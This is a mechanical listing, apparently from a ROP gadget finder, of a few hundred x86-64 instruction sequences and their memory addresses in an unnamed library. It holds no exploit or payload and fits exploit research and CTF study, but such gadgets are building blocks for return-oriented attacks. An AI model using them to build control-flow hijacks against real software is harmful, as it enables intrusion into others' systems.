0x00002aaaaab49f4e : cmp ecx, dword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x00002aaaaaaf4b03 : cmp ecx, eax ; je 0x1faa8 ; jmp 0x1fad1
0x00002aaaaac43e1b : cmp ecx, eax ; jne 0x16ee49 ; xor eax, eax ; ret
0x00002aaaaac4340f : cmp ecx, eax ; jne 0x16ee4d ; xor eax, eax ; ret
0x00002aaaaac43437 : cmp ecx, eax ; jne 0x16ee59 ; xor eax, eax ; ret
0x00002aaaaac44c5b : cmp ecx, eax ; jne 0x16fc89 ; xor eax, eax ; ret
0x00002aaaaac44a3f : cmp ecx, eax ; jne 0x16fc8d ; xor eax, eax ; ret
0x00002aaaaac44c8f : cmp ecx, eax ; jne 0x16fc9c ; xor eax, eax ; ret
0x00002aaaaab1d468 : cmp ecx, eax ; sbb eax, eax ; and eax, 2 ; sub eax, 1 ; ret
0x00002aaaaac102d3 : cmp ecx, edx ; jae 0x13b2e6 ; xor eax, eax ; ret
0x00002aaaaac10313 : cmp ecx, edx ; jae 0x13b326 ; xor eax, eax ; ret
0x00002aaaaab73028 : cmp ecx, edx ; je 0x9e029 ; cmp ecx, esi ; je 0x9e029 ; ret
0x00002aaaaab7302c : cmp ecx, esi ; je 0x9e025 ; ret
0x00002aaaaabe7710 : cmp edi, 0x56 ; je 0x11272a ; mov eax, 7 ; ret
0x00002aaaaab81069 : cmp edi, 0x7f ; ja 0xac07f ; mov eax, edi ; ret
0x00002aaaaab6a147 : cmp edi, 0xd ; je 0x95161 ; xor byte ptr [rdx + 0xe], 0x2a ; ret
0x00002aaaaac489c8 : cmp edi, 1 ; ja 0x1739d5 ; ret
0x00002aaaaabdeaed : cmp edi, 9 ; setbe al ; ret
0x00002aaaaab01b27 : cmp edi, dword ptr [rdx + 0x38] ; jae 0x2cb49 ; mov rax, qword ptr [rdx + rdi*8 + 0x40] ; ret
0x00002aaaaab1f49a : cmp edi, eax ; jbe 0x4a498 ; nop ; pop rbx ; ret
0x00002aaaaab254b5 : cmp edi, ecx ; ja 0x504a0 ; mov eax, r8d ; ret
0x00002aaaaac6ee41 : cmp edi, ecx ; jmp rsp
0x00002aaaaabd1241 : cmp edi, edx ; ja 0xfc275 ; ret
0x00002aaaaabcae60 : cmp edi, esi ; ja 0xf5e55 ; ret
0x00002aaaaab1f5bb : cmp edi, esi ; mov rax, rsi ; cmovae rax, rdi ; ret
0x00002aaaaac69fe5 : cmp edi, esp ; jmp qword ptr [rax + 0x20fffc3c]
0x00002aaaaac6a025 : cmp edi, esp ; jmp qword ptr [rax]
0x00002aaaaaba1648 : cmp edx, 0 ; mov eax, edx ; jle 0xcc660 ; ret
0x00002aaaaabed7df : cmp edx, 0x80000000 ; cmovne eax, edi ; ret
0x00002aaaaab8d9cd : cmp edx, 0x8944ffff ; ret 0x894d
0x00002aaaaab0fa00 : cmp edx, 0xff ; cmovne rax, rbx ; pop rbx ; ret
0x00002aaaaac0ef4a : cmp edx, 1 ; je 0x139fab ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0f00a : cmp edx, 1 ; je 0x13a06b ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0f0ca : cmp edx, 1 ; je 0x13a12b ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0f18a : cmp edx, 1 ; je 0x13a1eb ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabda147 : cmp edx, 1 ; jne 0x10514b ; add rsp, 0x78 ; pop rbx ; pop rbp ; ret
0x00002aaaaabda1b7 : cmp edx, 1 ; jne 0x1051bb ; add rsp, 0x78 ; pop rbx ; pop rbp ; ret
0x00002aaaaabab603 : cmp edx, 1 ; sbb eax, eax ; and eax, 2 ; add eax, 8 ; ret
0x00002aaaaaba5af6 : cmp edx, 1 ; sete al ; ret
0x00002aaaaabcf9b0 : cmp edx, 4 ; ja 0xfa9cb ; mov word ptr [rsi + 0x66], dx ; xor eax, eax ; ret
0x00002aaaaab4e6a1 : cmp edx, dword ptr [rax + 0xf480034] ; ret 0x8948
0x00002aaaaabab059 : cmp edx, dword ptr [rax + rax*4] ; mov eax, 0 ; cmove eax, esi ; ret
0x00002aaaaaad75dd : cmp edx, dword ptr [rbp + 0x1b] ; xor ah, byte ptr [rsi] ; sahf ; jl 0x257c ; loop 0x25c7 ; ret 0x23cb
0x00002aaaaaad75dc : cmp edx, dword ptr [rbp + 0x1b] ; xor ah, byte ptr [rsi] ; sahf ; jl 0x257d ; loop 0x25c8 ; ret 0x23cb
0x00002aaaaac5d698 : cmp edx, dword ptr [rbx - 0xc] ; inc dword ptr [rbp + 0x53] ; hlt ; dec dword ptr [rdi + 0x53] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaab02a7b : cmp edx, dword ptr [rdi + 4] ; jb 0x2da8e ; ret
0x00002aaaaabe97b2 : cmp edx, eax ; jne 0x114795 ; ret
0x00002aaaaab583da : cmp edx, eax ; jne 0x833a5 ; ret
0x00002aaaaab805b7 : cmp edx, eax ; jne 0xab5a7 ; xor eax, eax ; ret
0x00002aaaaabdcec4 : cmp edx, eax ; mov eax, 0 ; cmovae rax, rsi ; ret
0x00002aaaaabf78e6 : cmp edx, eax ; sbb eax, eax ; ret
0x00002aaaaac101bf : cmp edx, ecx ; je 0x13b1d5 ; ret
0x00002aaaaab63738 : cmp edx, ecx ; jne 0x8e725 ; ret
0x00002aaaaaba1ee7 : cmp edx, ecx ; jne 0xccf14 ; ret
0x00002aaaaabe8eba : cmp edx, edi ; setae al ; ret
0x00002aaaaabf82d6 : cmp edx, esi ; jb 0x1232cd ; mov eax, 0xffffffff ; ret
0x00002aaaaab73008 : cmp edx, esi ; je 0x9e005 ; ret
0x00002aaaaab81f16 : cmp edx, esi ; je 0xacf27 ; test edx, edx ; jne 0xacf19 ; ret
0x00002aaaaabf7cb9 : cmp esi, 0x14 ; mov edx, 0x107 ; cmove eax, edx ; ret
0x00002aaaaab90b0e : cmp esi, 0x3b ; cmova esi, edx ; imul esi, esi, 0x3c ; add eax, esi ; ret
0x00002aaaaabf83f6 : cmp esi, 0x7f ; ja 0x123413 ; shl esi, 4 ; lea eax, dword ptr [rsi + 8] ; ret
0x00002aaaaab48235 : cmp esi, 0xff ; je 0x7324a ; mov eax, 0xffffffff ; ret
0x00002aaaaab48059 : cmp esi, 0xff ; setne al ; neg eax ; ret
0x00002aaaaab4c4f8 : cmp esi, 2 ; je 0x77510 ; mov dword ptr [rdi], edx ; ret
0x00002aaaaabcacf0 : cmp esi, 2 ; mov eax, 0x16 ; jbe 0xf5d0b ; ret
0x00002aaaaaaff695 : cmp esi, 3 ; je 0x2a6a6 ; pop rbx ; ret
0x00002aaaaab80c71 : cmp esi, dword ptr [rdi + 8] ; cmove rax, rcx ; ret
0x00002aaaaac02bfa : cmp esi, dword ptr [rdx + 0x28] ; ja 0x12dbf1 ; mov qword ptr [rdx + 0x20], rsi ; ret
0x00002aaaaac695b0 : cmp esi, dword ptr [rsi - 0x482e0003] ; std ; call rcx
0x00002aaaaab528bd : cmp esi, eax ; jne 0x7d893 ; mov rdi, rbx ; neg rdi ; call qword ptr [r15]
0x00002aaaaab71e0e : cmp esi, eax ; jne 0x9ce0b ; jmp 0x9c7be
0x00002aaaaab72848 : cmp esi, eax ; jne 0x9d845 ; jmp 0x9c846
0x00002aaaaac596e4 : cmp esi, ebp ; xlatb ; ret 0x4e27
0x00002aaaaab47d5a : cmp esi, ecx ; jb 0x72d57 ; lea eax, dword ptr [rdx + rdi] ; ret
0x00002aaaaac1eb24 : cmp esi, ecx ; jle 0x149a43 ; movsxd rax, ecx ; ret
0x00002aaaaac1ed68 : cmp esi, ecx ; jle 0x149cad ; ret
0x00002aaaaab5100a : cmp esi, ecx ; jne 0x7c007 ; lea eax, dword ptr [rdx + rdi] ; ret
0x00002aaaaabf834e : cmp esi, edx ; ja 0x12333d ; mov eax, 0xffffffff ; ret
0x00002aaaaab1d21d : cmp esi, edx ; jne 0x48216 ; xor eax, eax ; ret
0x00002aaaaab4801f : cmp esi, edx ; mov eax, 0xffffffff ; ja 0x7303a ; ret
0x00002aaaaac6a28d : cmp esp, 0xfc7720ff ; jmp rax
0x00002aaaaac6a10d : cmp esp, 0xfc8162ff ; call rdx
0x00002aaaaac6a08d : cmp esp, 0xfc8176ff ; jmp rsi
0x00002aaaaac6a289 : cmp esp, 0xfc8180ff ; jmp qword ptr [rax]
0x00002aaaaac6a1d1 : cmp esp, 0xfc87b4ff ; inc dword ptr [rdi + rax*4 - 4] ; call rsp
0x00002aaaaac6a051 : cmp esp, 0xfc8800ff ; call qword ptr [rax + 0x20fffc87]
0x00002aaaaac6a13d : cmp esp, 0xff ; add al, byte ptr [rbx - 0x7d6d0004] ; cld ; jmp qword ptr [rdx]
0x00002aaaaac6a9dd : cmp esp, 0xff ; push rax ; test edi, esp ; call rax
0x00002aaaaac6a081 : cmp esp, 0xff ; rol byte ptr [rdx - 0x7daf0004], 0xfc ; jmp rax
0x00002aaaaac69fe1 : cmp esp, edi ; jmp qword ptr [rax]
0x00002aaaaabcae2c : cmp esp, esi ; ja 0xf5dc8 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab03198 : cmp qword ptr [r8], r8 ; mov qword ptr fs:[rdx], rax ; ret
0x00002aaaaab47aa7 : cmp qword ptr [rax + 0x30], 0 ; je 0x72ab7 ; ret
0x00002aaaaab4c3e3 : cmp qword ptr [rdi + 0x18], 0 ; setne al ; ret
0x00002aaaaab50560 : cmp qword ptr [rdi + 0x38], 0 ; je 0x7b577 ; ret
0x00002aaaaabe8e57 : cmp qword ptr [rdi], 0 ; je 0x113e6f ; ret
0x00002aaaaabe9f6e : cmp qword ptr [rdx + rcx*8 - 8], 1 ; sbb eax, 0 ; leave ; ret
0x00002aaaaab5d370 : cmp qword ptr [rip + 0x33d4f0], 0 ; je 0x8838a ; ret
0x00002aaaaabd68fc : cmp qword ptr [rsi], 0 ; je 0x10190f ; pop rbx ; ret
0x00002aaaaab69122 : cmp r11b, r14b ; ret
0x00002aaaaabe9505 : cmp r11d, 0xa ; je 0x114512 ; ret
0x00002aaaaabcae2b : cmp r12, rsi ; ja 0xf5dc9 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab31465 : cmp r12b, 0x49 ; cmove esi, ecx ; jmp 0x5c438
0x00002aaaaab1d4c3 : cmp r8, 0xff ; jne 0x484ba ; mov rax, rdx ; ret
0x00002aaaaabf7cd6 : cmp r8, 0xff ; mov edx, 0x104 ; cmove eax, edx ; ret
0x00002aaaaab7307c : cmp r8d, ecx ; je 0x9e066 ; ret
0x00002aaaaababa97 : cmp r8d, esi ; jge 0xd6a76 ; mov edx, eax ; jmp 0xd6a7f
0x00002aaaaaaf4b02 : cmp r9, rax ; je 0x1faa9 ; jmp 0x1fad2
0x00002aaaaabb540f : cmp r9b, 0x11 ; je 0xe0453 ; mov rdx, rax ; jmp 0xe03b7
0x00002aaaaabe35d1 : cmp r9b, r13b ; ret
0x00002aaaaabd9ace : cmp rax, -0x1000 ; ja 0x104ae9 ; ret
0x00002aaaaabdb78e : cmp rax, -0x1000 ; ja 0x1067a9 ; ret
0x00002aaaaabdb9d0 : cmp rax, -0x1000 ; ja 0x1069e8 ; ret
0x00002aaaaabdba82 : cmp rax, -0x1000 ; ja 0x106a99 ; ret
0x00002aaaaabdbabc : cmp rax, -0x1000 ; ja 0x106ad9 ; ret
0x00002aaaaabdc66d : cmp rax, -0x1000 ; ja 0x107688 ; ret
0x00002aaaaabdc7ed : cmp rax, -0x1000 ; ja 0x107808 ; ret
0x00002aaaaabdcc87 : cmp rax, -0x1000 ; ja 0x107c98 ; ret
0x00002aaaaabdcd29 : cmp rax, -0x1000 ; ja 0x107d40 ; ret
0x00002aaaaabdcdd9 : cmp rax, -0x1000 ; ja 0x107df0 ; ret
0x00002aaaaabe9c3a : cmp rax, -0x1000 ; ja 0x114c51 ; ret
0x00002aaaaabe9ce7 : cmp rax, -0x1000 ; ja 0x114d13 ; ret
0x00002aaaaabeb9ac : cmp rax, -0x1000 ; ja 0x1169c9 ; ret
0x00002aaaaabeba5c : cmp rax, -0x1000 ; ja 0x116a79 ; ret
0x00002aaaaab0a428 : cmp rax, -0x1000 ; ja 0x35459 ; ret
0x00002aaaaab0a730 : cmp rax, -0x1000 ; ja 0x35749 ; ret
0x00002aaaaab0a79c : cmp rax, -0x1000 ; ja 0x357b9 ; ret
0x00002aaaaab0a7e6 : cmp rax, -0x1000 ; ja 0x357f8 ; ret
0x00002aaaaab90887 : cmp rax, -0x1000 ; ja 0xbb8a1 ; ret
0x00002aaaaab9c827 : cmp rax, -0x1000 ; ja 0xc7841 ; pop rbx ; ret
0x00002aaaaab9daa1 : cmp rax, -0x1000 ; ja 0xc8ab8 ; ret
0x00002aaaaaba0430 : cmp rax, -0x1000 ; ja 0xcb448 ; ret
0x00002aaaaaba04ca : cmp rax, -0x1000 ; ja 0xcb4e0 ; ret
0x00002aaaaaba05bb : cmp rax, -0x1000 ; ja 0xcb5d0 ; ret
0x00002aaaaaba1713 : cmp rax, -0x1000 ; ja 0xcc728 ; ret
0x00002aaaaaba1783 : cmp rax, -0x1000 ; ja 0xcc798 ; ret
0x00002aaaaaba19d7 : cmp rax, -0x1000 ; ja 0xcc9e8 ; ret
0x00002aaaaaba1a57 : cmp rax, -0x1000 ; ja 0xcca68 ; ret
0x00002aaaaabcb005 : cmp rax, -0x1000 ; ja 0xf6019 ; ret
0x00002aaaaabcb054 : cmp rax, -0x1000 ; ja 0xf6069 ; ret
0x00002aaaaabcb0a5 : cmp rax, -0x1000 ; ja 0xf60b9 ; ret
0x00002aaaaabcb0fd : cmp rax, -0x1000 ; ja 0xf6119 ; ret
0x00002aaaaabcb161 : cmp rax, -0x1000 ; ja 0xf6179 ; ret
0x00002aaaaabcb1ba : cmp rax, -0x1000 ; ja 0xf61d1 ; ret
0x00002aaaaabcb399 : cmp rax, -0x1000 ; ja 0xf63b1 ; ret
0x00002aaaaabcba63 : cmp rax, -0x1000 ; ja 0xf6aa9 ; ret
0x00002aaaaabcfee2 : cmp rax, -0x1000 ; ja 0xfaef9 ; ret
0x00002aaaaabcff36 : cmp rax, -0x1000 ; ja 0xfaf49 ; ret
0x00002aaaaabd068a : cmp rax, -0x1000 ; ja 0xfb6a0 ; ret
0x00002aaaaabd0bae : cmp rax, -0x1000 ; ja 0xfbbc8 ; ret
0x00002aaaaabd145a : cmp rax, -0x1000 ; ja 0xfc470 ; ret
0x00002aaaaabd150a : cmp rax, -0x1000 ; ja 0xfc520 ; ret
0x00002aaaaabd15b5 : cmp rax, -0x1000 ; ja 0xfc5c8 ; ret
0x00002aaaaabd1625 : cmp rax, -0x1000 ; ja 0xfc638 ; ret
0x00002aaaaabd16a6 : cmp rax, -0x1000 ; ja 0xfc6b8 ; ret
0x00002aaaaabd1756 : cmp rax, -0x1000 ; ja 0xfc768 ; ret
0x00002aaaaabd1ca6 : cmp rax, -0x1000 ; ja 0xfccb9 ; ret
0x00002aaaaabd33c7 : cmp rax, -0x1000 ; ja 0xfe3e1 ; ret
0x00002aaaaabd345b : cmp rax, -0x1000 ; ja 0xfe471 ; ret
0x00002aaaaabd34fb : cmp rax, -0x1000 ; ja 0xfe511 ; ret
0x00002aaaaabd354f : cmp rax, -0x1000 ; ja 0xfe569 ; ret
0x00002aaaaabd58e9 : cmp rax, -0xfff ; jae 0x1008fa ; ret
0x00002aaaaabd5b57 : cmp rax, -0xfff ; jae 0x100b68 ; ret
0x00002aaaaabd5b87 : cmp rax, -0xfff ; jae 0x100b98 ; ret
0x00002aaaaabd5bc0 : cmp rax, -0xfff ; jae 0x100c01 ; ret
0x00002aaaaabd5c17 : cmp rax, -0xfff ; jae 0x100c28 ; ret
0x00002aaaaabd5c47 : cmp rax, -0xfff ; jae 0x100c58 ; ret
0x00002aaaaabd5c7a : cmp rax, -0xfff ; jae 0x100c8b ; ret
0x00002aaaaabd5ca7 : cmp rax, -0xfff ; jae 0x100cb8 ; ret
0x00002aaaaabd5cd7 : cmp rax, -0xfff ; jae 0x100ce8 ; ret
0x00002aaaaabd5d07 : cmp rax, -0xfff ; jae 0x100d18 ; ret
0x00002aaaaabd5d37 : cmp rax, -0xfff ; jae 0x100d48 ; ret
0x00002aaaaabda3fa : cmp rax, -0xfff ; jae 0x10540b ; ret
0x00002aaaaabda427 : cmp rax, -0xfff ; jae 0x105438 ; ret
0x00002aaaaabda457 : cmp rax, -0xfff ; jae 0x105468 ; ret
0x00002aaaaabda48a : cmp rax, -0xfff ; jae 0x10549b ; ret
0x00002aaaaabda4ba : cmp rax, -0xfff ; jae 0x1054cb ; ret
0x00002aaaaabda4e7 : cmp rax, -0xfff ; jae 0x1054f8 ; ret
0x00002aaaaabda51a : cmp rax, -0xfff ; jae 0x10552b ; ret
0x00002aaaaabda547 : cmp rax, -0xfff ; jae 0x105558 ; ret
0x00002aaaaabda577 : cmp rax, -0xfff ; jae 0x105588 ; ret
0x00002aaaaabda5aa : cmp rax, -0xfff ; jae 0x1055bb ; ret
0x00002aaaaabda5d7 : cmp rax, -0xfff ; jae 0x1055e8 ; ret
0x00002aaaaabda60a : cmp rax, -0xfff ; jae 0x10561b ; ret
0x00002aaaaabdb6f7 : cmp rax, -0xfff ; jae 0x106708 ; ret
0x00002aaaaabdb727 : cmp rax, -0xfff ; jae 0x106738 ; ret
0x00002aaaaabdb857 : cmp rax, -0xfff ; jae 0x106868 ; ret
0x00002aaaaabdb897 : cmp rax, -0xfff ; jae 0x1068a8 ; ret
0x00002aaaaabdb8c7 : cmp rax, -0xfff ; jae 0x1068d8 ; ret
0x00002aaaaabdb8f7 : cmp rax, -0xfff ; jae 0x106908 ; ret
0x00002aaaaabdb927 : cmp rax, -0xfff ; jae 0x106938 ; ret
0x00002aaaaabdbb4a : cmp rax, -0xfff ; jae 0x106b5b ; ret
0x00002aaaaabdbb77 : cmp rax, -0xfff ; jae 0x106b88 ; ret
0x00002aaaaabdbba7 : cmp rax, -0xfff ; jae 0x106bb8 ; ret
0x00002aaaaabdbbd7 : cmp rax, -0xfff ; jae 0x106be8 ; ret
0x00002aaaaabdbc1a : cmp rax, -0xfff ; jae 0x106c2b ; ret
0x00002aaaaabdbc47 : cmp rax, -0xfff ; jae 0x106c58 ; ret
0x00002aaaaabdbc77 : cmp rax, -0xfff ; jae 0x106c88 ; ret
0x00002aaaaabdbca7 : cmp rax, -0xfff ; jae 0x106cb8 ; ret
0x00002aaaaabdbcd7 : cmp rax, -0xfff ; jae 0x106ce8 ; ret
0x00002aaaaabdbd07 : cmp rax, -0xfff ; jae 0x106d18 ; ret
0x00002aaaaabdbd37 : cmp rax, -0xfff ; jae 0x106d48 ; ret
0x00002aaaaabdbd67 : cmp rax, -0xfff ; jae 0x106d78 ; ret
0x00002aaaaabdbd97 : cmp rax, -0xfff ; jae 0x106da8 ; ret
0x00002aaaaabdbdca : cmp rax, -0xfff ; jae 0x106ddb ; ret
0x00002aaaaabdbe03 : cmp rax, -0xfff ; jae 0x106e47 ; ret
0x00002aaaaabdbe57 : cmp rax, -0xfff ; jae 0x106e68 ; ret
0x00002aaaaabdbe8a : cmp rax, -0xfff ; jae 0x106e9b ; ret
0x00002aaaaabdbeb7 : cmp rax, -0xfff ; jae 0x106ec8 ; ret
0x00002aaaaabdbee7 : cmp rax, -0xfff ; jae 0x106ef8 ; ret
0x00002aaaaabdbf17 : cmp rax, -0xfff ; jae 0x106f28 ; ret
0x00002aaaaabdbf47 : cmp rax, -0xfff ; jae 0x106f58 ; ret
0x00002aaaaabdbf77 : cmp rax, -0xfff ; jae 0x106f88 ; ret
0x00002aaaaabdbfaa : cmp rax, -0xfff ; jae 0x106fbb ; ret
0x00002aaaaabdbfda : cmp rax, -0xfff ; jae 0x106feb ; ret
0x00002aaaaabdc007 : cmp rax, -0xfff ; jae 0x107018 ; ret
0x00002aaaaabdc037 : cmp rax, -0xfff ; jae 0x107048 ; ret
0x00002aaaaabdc06a : cmp rax, -0xfff ; jae 0x10707b ; ret
0x00002aaaaabdc09a : cmp rax, -0xfff ; jae 0x1070ab ; ret
0x00002aaaaabdc0ca : cmp rax, -0xfff ; jae 0x1070db ; ret
0x00002aaaaabdc103 : cmp rax, -0xfff ; jae 0x107147 ; ret
0x00002aaaaabdc157 : cmp rax, -0xfff ; jae 0x107168 ; ret
0x00002aaaaabdc193 : cmp rax, -0xfff ; jae 0x1071d7 ; ret
0x00002aaaaabdc1e7 : cmp rax, -0xfff ; jae 0x1071f8 ; ret
0x00002aaaaabdc217 : cmp rax, -0xfff ; jae 0x107228 ; ret
0x00002aaaaabdc253 : cmp rax, -0xfff ; jae 0x107297 ; ret
0x00002aaaaabdc2a7 : cmp rax, -0xfff ; jae 0x1072b8 ; ret
0x00002aaaaabdc2da : cmp rax, -0xfff ; jae 0x1072eb ; ret
0x00002aaaaabdc307 : cmp rax, -0xfff ; jae 0x107318 ; ret
0x00002aaaaabdc337 : cmp rax, -0xfff ; jae 0x107348 ; ret
0x00002aaaaabdc36a : cmp rax, -0xfff ; jae 0x10737b ; ret
0x00002aaaaabdc3a0 : cmp rax, -0xfff ; jae 0x1073e1 ; ret
0x00002aaaaabdc3f7 : cmp rax, -0xfff ; jae 0x107408 ; ret
0x00002aaaaabdc42a : cmp rax, -0xfff ; jae 0x10743b ; ret
0x00002aaaaabdc45a : cmp rax, -0xfff ; jae 0x10746b ; ret
0x00002aaaaabdc4b0 : cmp rax, -0xfff ; jae 0x1074f1 ; ret
0x00002aaaaabdc507 : cmp rax, -0xfff ; jae 0x107518 ; ret
0x00002aaaaabdc540 : cmp rax, -0xfff ; jae 0x107581 ; ret
0x00002aaaaabdc597 : cmp rax, -0xfff ; jae 0x1075a8 ; ret
0x00002aaaaabdc5c7 : cmp rax, -0xfff ; jae 0x1075d8 ; ret
0x00002aaaaabdc5fa : cmp rax, -0xfff ; jae 0x10760b ; ret
0x00002aaaaabdc627 : cmp rax, -0xfff ; jae 0x107638 ; ret
0x00002aaaaabdc723 : cmp rax, -0xfff ; jae 0x107767 ; ret
0x00002aaaaabdc780 : cmp rax, -0xfff ; jae 0x1077c1 ; ret
0x00002aaaaabdc8a0 : cmp rax, -0xfff ; jae 0x1078e1 ; ret
0x00002aaaaabdc903 : cmp rax, -0xfff ; jae 0x107947 ; ret
0x00002aaaaabdc95a : cmp rax, -0xfff ; jae 0x10796b ; ret
0x00002aaaaabdc987 : cmp rax, -0xfff ; jae 0x107998 ; ret
0x00002aaaaabdc9b7 : cmp rax, -0xfff ; jae 0x1079c8 ; ret
0x00002aaaaabdc9ea : cmp rax, -0xfff ; jae 0x1079fb ; ret
0x00002aaaaabdcf43 : cmp rax, -0xfff ; jae 0x107f87 ; ret
0x00002aaaaabdcfa3 : cmp rax, -0xfff ; jae 0x107fe7 ; ret
0x00002aaaaabdcff7 : cmp rax, -0xfff ; jae 0x108008 ; ret
0x00002aaaaabdd027 : cmp rax, -0xfff ; jae 0x108038 ; ret
0x00002aaaaabdd057 : cmp rax, -0xfff ; jae 0x108068 ; ret
0x00002aaaaabdd087 : cmp rax, -0xfff ; jae 0x108098 ; ret
0x00002aaaaabdd0ba : cmp rax, -0xfff ; jae 0x1080cb ; ret
0x00002aaaaabdd0ea : cmp rax, -0xfff ; jae 0x1080fb ; ret
0x00002aaaaabdd117 : cmp rax, -0xfff ; jae 0x108128 ; ret
0x00002aaaaabdd147 : cmp rax, -0xfff ; jae 0x108158 ; ret
0x00002aaaaabdd177 : cmp rax, -0xfff ; jae 0x108188 ; ret
0x00002aaaaabdd1a7 : cmp rax, -0xfff ; jae 0x1081b8 ; ret
0x00002aaaaac14aaa : cmp rax, -0xfff ; jae 0x13fabb ; ret
0x00002aaaaac14afa : cmp rax, -0xfff ; jae 0x13fb0b ; ret
0x00002aaaaab0a767 : cmp rax, -0xfff ; jae 0x35778 ; ret
0x00002aaaaab0ae27 : cmp rax, -0xfff ; jae 0x35e38 ; ret
0x00002aaaaab1cb21 : cmp rax, -0xfff ; jae 0x47b36 ; xor eax, eax ; ret
0x00002aaaaab40367 : cmp rax, -0xfff ; jae 0x6b378 ; ret
0x00002aaaaab4039a : cmp rax, -0xfff ; jae 0x6b3ab ; ret
0x00002aaaaab90967 : cmp rax, -0xfff ; jae 0xbb978 ; ret
0x00002aaaaab93a57 : cmp rax, -0xfff ; jae 0xbea68 ; ret
0x00002aaaaab93a87 : cmp rax, -0xfff ; jae 0xbea98 ; ret
0x00002aaaaaba0387 : cmp rax, -0xfff ; jae 0xcb398 ; ret
0x00002aaaaaba057a : cmp rax, -0xfff ; jae 0xcb58b ; ret
0x00002aaaaaba0657 : cmp rax, -0xfff ; jae 0xcb668 ; ret
0x00002aaaaaba06e0 : cmp rax, -0xfff ; jae 0xcb721 ; ret
0x00002aaaaaba0740 : cmp rax, -0xfff ; jae 0xcb781 ; ret
0x00002aaaaaba0bc7 : cmp rax, -0xfff ; jae 0xcbbd8 ; ret
0x00002aaaaaba16d7 : cmp rax, -0xfff ; jae 0xcc6e8 ; ret
0x00002aaaaaba1877 : cmp rax, -0xfff ; jae 0xcc888 ; ret
0x00002aaaaaba18a7 : cmp rax, -0xfff ; jae 0xcc8b8 ; ret
0x00002aaaaaba1907 : cmp rax, -0xfff ; jae 0xcc918 ; ret
0x00002aaaaaba1937 : cmp rax, -0xfff ; jae 0xcc948 ; ret
0x00002aaaaaba1967 : cmp rax, -0xfff ; jae 0xcc978 ; ret
0x00002aaaaaba1997 : cmp rax, -0xfff ; jae 0xcc9a8 ; ret
0x00002aaaaabbeb87 : cmp rax, -0xfff ; jae 0xe9b98 ; ret
0x00002aaaaabbebb7 : cmp rax, -0xfff ; jae 0xe9bc8 ; ret
0x00002aaaaabbebe7 : cmp rax, -0xfff ; jae 0xe9bf8 ; ret
0x00002aaaaabbec17 : cmp rax, -0xfff ; jae 0xe9c28 ; ret
0x00002aaaaabbec47 : cmp rax, -0xfff ; jae 0xe9c58 ; ret
0x00002aaaaabbec77 : cmp rax, -0xfff ; jae 0xe9c88 ; ret
0x00002aaaaabbeca7 : cmp rax, -0xfff ; jae 0xe9cb8 ; ret
0x00002aaaaabbecd7 : cmp rax, -0xfff ; jae 0xe9ce8 ; ret
0x00002aaaaabc9e93 : cmp rax, -0xfff ; jae 0xf4ed7 ; ret
0x00002aaaaabc9ef3 : cmp rax, -0xfff ; jae 0xf4f37 ; ret
0x00002aaaaabcaf67 : cmp rax, -0xfff ; jae 0xf5f78 ; ret
0x00002aaaaabcb207 : cmp rax, -0xfff ; jae 0xf6218 ; ret
0x00002aaaaabcb237 : cmp rax, -0xfff ; jae 0xf6248 ; ret
0x00002aaaaabcb307 : cmp rax, -0xfff ; jae 0xf6318 ; ret
0x00002aaaaabcb337 : cmp rax, -0xfff ; jae 0xf6348 ; ret
0x00002aaaaabcb3f7 : cmp rax, -0xfff ; jae 0xf6408 ; ret
0x00002aaaaabcb427 : cmp rax, -0xfff ; jae 0xf6438 ; ret
0x00002aaaaabcb460 : cmp rax, -0xfff ; jae 0xf64a1 ; ret
0x00002aaaaabcb680 : cmp rax, -0xfff ; jae 0xf66c1 ; ret
0x00002aaaaabcb6e0 : cmp rax, -0xfff ; jae 0xf6721 ; ret
0x00002aaaaabcb737 : cmp rax, -0xfff ; jae 0xf6748 ; ret
0x00002aaaaabcbbc7 : cmp rax, -0xfff ; jae 0xf6bd8 ; ret
0x00002aaaaabcbd10 : cmp rax, -0xfff ; jae 0xf6d51 ; ret
0x00002aaaaabcbd67 : cmp rax, -0xfff ; jae 0xf6d78 ; ret
0x00002aaaaabcbd97 : cmp rax, -0xfff ; jae 0xf6da8 ; ret
0x00002aaaaabcbdc7 : cmp rax, -0xfff ; jae 0xf6dd8 ; ret
0x00002aaaaabcbdf7 : cmp rax, -0xfff ; jae 0xf6e08 ; ret
0x00002aaaaabcbe27 : cmp rax, -0xfff ; jae 0xf6e38 ; ret
0x00002aaaaabcbe60 : cmp rax, -0xfff ; jae 0xf6ea1 ; ret
0x00002aaaaabcbeb7 : cmp rax, -0xfff ; jae 0xf6ec8 ; ret
0x00002aaaaabcbee7 : cmp rax, -0xfff ; jae 0xf6ef8 ; ret
0x00002aaaaabcc717 : cmp rax, -0xfff ; jae 0xf7728 ; ret
0x00002aaaaabcc747 : cmp rax, -0xfff ; jae 0xf7758 ; ret
0x00002aaaaabcc777 : cmp rax, -0xfff ; jae 0xf7788 ; ret
0x00002aaaaabcc7aa : cmp rax, -0xfff ; jae 0xf77bb ; ret
0x00002aaaaabccd87 : cmp rax, -0xfff ; jae 0xf7d98 ; ret
0x00002aaaaabccdba : cmp rax, -0xfff ; jae 0xf7dcb ; ret
0x00002aaaaabccde7 : cmp rax, -0xfff ; jae 0xf7df8 ; ret
0x00002aaaaabcce17 : cmp rax, -0xfff ; jae 0xf7e28 ; ret
0x00002aaaaabcce47 : cmp rax, -0xfff ; jae 0xf7e58 ; ret
0x00002aaaaabcce7a : cmp rax, -0xfff ; jae 0xf7e8b ; ret
0x00002aaaaabccea7 : cmp rax, -0xfff ; jae 0xf7eb8 ; ret
0x00002aaaaabcced7 : cmp rax, -0xfff ; jae 0xf7ee8 ; ret
0x00002aaaaabccf07 : cmp rax, -0xfff ; jae 0xf7f18 ; ret
0x00002aaaaabcfb40 : cmp rax, -0xfff ; jae 0xfab81 ; ret
0x00002aaaaabcfeaa : cmp rax, -0xfff ; jae 0xfaebb ; ret
0x00002aaaaabd0623 : cmp rax, -0xfff ; jae 0xfb667 ; ret
0x00002aaaaabd0d77 : cmp rax, -0xfff ; jae 0xfbd88 ; ret
